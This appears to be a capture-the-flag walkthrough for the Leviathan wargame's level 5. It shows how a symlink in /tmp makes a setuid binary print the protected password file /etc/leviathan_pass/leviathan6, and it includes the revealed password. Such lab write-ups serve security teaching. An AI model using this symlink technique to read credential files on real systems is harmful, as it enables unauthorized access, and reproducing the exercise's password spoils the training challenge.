Leviathan Level 5 → Level 6
===========================

Level Goal
----------

There is no information for this level, intentionally.

Solution
========

There's no hint text or anything else for this level. So let's look around what we can find in the home directory:

```
leviathan5@leviathan:~$ ls -al
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

Let's see what binary file **leviathan5** does when we execute it:

```
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
```

It obviously expects a file named **/tmp/file.log** in order to display its content. Since we want to get the contents of **/etc/leviathan_pass/leviathan6** in order to get the password for the next level, we create a symlink named **/tmp/file.log** which points to **/etc/leviathan_pass/leviathan6**:

```
leviathan5@leviathan:$ cd /tmp
leviathan5@leviathan:/tmp$ ln -s /etc/leviathan_pass/leviathan6 file.log
leviathan5@leviathan:/tmp$ cd
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```

That was easy! :-)
